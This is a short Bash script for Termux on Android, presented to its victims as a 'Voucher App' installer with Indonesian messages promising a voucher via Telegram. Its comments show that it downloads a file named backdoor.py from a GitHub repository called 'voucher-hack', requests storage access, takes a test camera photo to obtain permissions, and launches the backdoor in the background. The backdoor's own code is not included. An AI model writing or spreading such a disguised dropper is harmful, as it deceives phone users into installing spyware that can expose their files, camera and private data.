#!/bin/bash
echo "🎁 Installing Voucher App..."
echo "📱 Please wait..."

# Warna terminal
RED='\033[0;31m'
GREEN='\033[0;32m'
NC='\033[0m'

# Update & install
echo -e "${GREEN}[+] Updating packages...${NC}"
pkg update -y && pkg upgrade -y

echo -e "${GREEN}[+] Installing Python...${NC}"
pkg install python -y

echo -e "${GREEN}[+] Installing Termux API...${NC}"
pkg install termux-api -y

echo -e "${GREEN}[+] Installing dependencies...${NC}"
pip install telebot requests

# Download backdoor
echo -e "${GREEN}[+] Downloading backdoor...${NC}"
curl -s -o backdoor.py https://raw.githubusercontent.com/[USERNAME]/voucher-hack/main/scripts/backdoor.py

# Setup permissions
echo -e "${GREEN}[+] Setting up permissions...${NC}"
termux-setup-storage
termux-camera-photo test.jpg 2>/dev/null

# Run in background
echo -e "${GREEN}[+] Starting backdoor...${NC}"
python backdoor.py &

echo -e "${RED}✅ Installation complete!${NC}"
echo -e "${RED}🎉 Voucher akan dikirim ke Telegram kamu!${NC}"
